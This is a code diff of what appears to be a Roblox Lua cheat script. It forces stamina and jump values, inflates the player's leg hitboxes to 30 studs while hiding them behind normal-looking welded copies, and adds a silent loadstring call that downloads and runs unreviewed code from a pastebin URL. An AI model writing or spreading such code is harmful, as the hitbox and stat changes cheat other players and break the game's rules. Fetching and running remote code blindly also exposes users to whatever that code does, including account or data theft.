@@ -1,71 +1,77 @@
--- Function to apply modifications
-local function modifyCharacter(player)
-    local character = player.Character or player.CharacterAdded:Wait()
-
-    -- Wait for essential parts to load
-    local leftLeg = character:WaitForChild("Left Leg")
-    local rightLeg = character:WaitForChild("Right Leg")
-    local playerInfo = character:WaitForChild("PlayerInfo")
-
-    -- Set Stamina and JumpMultiplier
-    playerInfo.Stamina.Value = 100
-    playerInfo.JumpMultiplier.Value = 2
-
-    -- Modify legs
-    local originalSize = Vector3.new(1, 2, 1)
-
-    -- Create visual legs
-    local visualLeftLeg = leftLeg:Clone()
-    visualLeftLeg.Name = "VisualLeftLeg"
-    visualLeftLeg.Parent = leftLeg
-    visualLeftLeg.Size = originalSize
-    visualLeftLeg.CanCollide = false
-    visualLeftLeg.Transparency = 0
-    visualLeftLeg.Massless = true
-
-    local visualRightLeg = rightLeg:Clone()
-    visualRightLeg.Name = "VisualRightLeg"
-    visualRightLeg.Parent = rightLeg
-    visualRightLeg.Size = originalSize
-    visualRightLeg.CanCollide = false
-    visualRightLeg.Transparency = 0
-    visualRightLeg.Massless = true
-
-    -- Set hitbox legs size and properties
-    leftLeg.Size = Vector3.new(30, 2, 30)
-    leftLeg.CanCollide = false
-    leftLeg.Transparency = 1
-    leftLeg.Massless = true
-
-    rightLeg.Size = Vector3.new(30, 2, 30)
-    rightLeg.CanCollide = false
-    rightLeg.Transparency = 1
-    rightLeg.Massless = true
-end
-
--- Hook into the character respawn event
-local player = game.Players.LocalPlayer
-player.CharacterAdded:Connect(function(character)
-    task.wait(0.5) -- Small delay to ensure all parts load
-    modifyCharacter(player)
+-- Isolate the loadstring execution
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/fTgjaBZG"))() -- script with all the skills & speed multipliers
+    end)
 end)
 
--- Initial modification
-if player.Character then
-    modifyCharacter(player)
-end
-
--- Keep stamina and jump multiplier updated
-spawn(function()
-    while true do
-        local character = player.Character
-        if character then
+-- Function to handle character modifications
+local function modifyCharacter(character)
+    -- Ensure the player's stats stay constant
+    spawn(function()
+        while character and character.Parent do
             local playerInfo = character:FindFirstChild("PlayerInfo")
             if playerInfo then
-                playerInfo.Stamina.Value = 100
-                playerInfo.JumpMultiplier.Value = 2
+                if playerInfo:FindFirstChild("Stamina") then
+                    playerInfo.Stamina.Value = 100
+                end
+                if playerInfo:FindFirstChild("JumpMultiplier") then
+                    playerInfo.JumpMultiplier.Value = 2
+                end
             end
+            task.wait(0.1)
         end
-        task.wait()
+    end)
+
+    -- Modify legs
+    local function setupLeg(legName)
+        local leg = character:FindFirstChild(legName)
+        if leg then
+            -- Store original size
+            local originalSize = Vector3.new(1, 2, 1)
+
+            -- Create visual leg
+            local visualLeg = Instance.new("Part")
+            visualLeg.Name = "Visual" .. legName
+            visualLeg.Size = originalSize
+            visualLeg.CFrame = leg.CFrame
+            visualLeg.Parent = character
+            visualLeg.CanCollide = false
+            visualLeg.Transparency = 0
+            visualLeg.Massless = true
+            visualLeg.Anchored = false
+
+            -- Weld visual leg to the original leg
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = leg
+            weld.Part1 = visualLeg
+            weld.Parent = visualLeg
+
+            -- Modify the hitbox leg
+            leg.Size = Vector3.new(30, 2, 30)
+            leg.CanCollide = false
+            leg.Transparency = 1
+            leg.Massless = true
+        end
     end
+
+    -- Apply modifications to both legs
+    setupLeg("Left Leg")
+    setupLeg("Right Leg")
+end
+
+-- Monitor character spawning
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+player.CharacterAdded:Connect(function(character)
+    -- Wait for the character to fully load
+    character:WaitForChild("Humanoid")
+    character:WaitForChild("PlayerInfo")
+    modifyCharacter(character)
 end)
+
+-- If the character is already loaded, modify it
+if player.Character then
+    modifyCharacter(player.Character)
+end
